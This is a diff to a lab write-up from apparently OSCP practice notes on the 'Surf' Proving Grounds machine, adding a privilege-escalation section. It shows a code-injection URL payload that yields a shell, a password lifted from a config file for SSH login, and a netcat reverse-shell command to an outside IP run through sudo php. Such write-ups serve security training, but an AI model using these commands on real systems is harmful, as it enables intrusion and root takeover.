@@ -58,7 +58,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ```
 
-After browsing a while, the website looks nothing interesting. We use feroxbuster to discover new content.
+After browsing for a while, the website looks nothing interesting. We use feroxbuster to discover new content.
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_11h00m37s_001_.png)
 
@@ -111,3 +111,39 @@ http://127.0.0.1:8080/infusions/downloads/downloads.php?cat_id=${system(base64_d
 Sending the request to the server and get the shell successfully.
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h31m46s_012_.png)
+
+#### Privilege Escalation
+
+After searching for a while, I find there is a file in ```/var/www/server/administration/config/config.php``` includes the password.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h55m46s_013_.png)
+
+We use the username ```james``` and password ```FlyToTheMoon213!``` to log in via ssh.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h57m01s_014_.png)
+
+Running the linpeas script and find james can run follow command as root.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_17h02m58s_015_.png)
+
+We have to check the file permission.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_17h05m35s_016_.png)
+
+Because user ```www-data``` can modify file. We reconnect to www-data session shell and change the codes. 
+
+```
+echo "<?php system(\"nc -e /bin/bash 192.168.49.162 80\"); ?>" >  /var/backups/database-backup.php
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_17h31m28s_017_.png)
+
+Executing the php file with sudo.
+
+```
+sudo /usr/bin/php /var/backups/database-backup.php
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_17h31m55s_018_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_17h32m21s_019_.png)
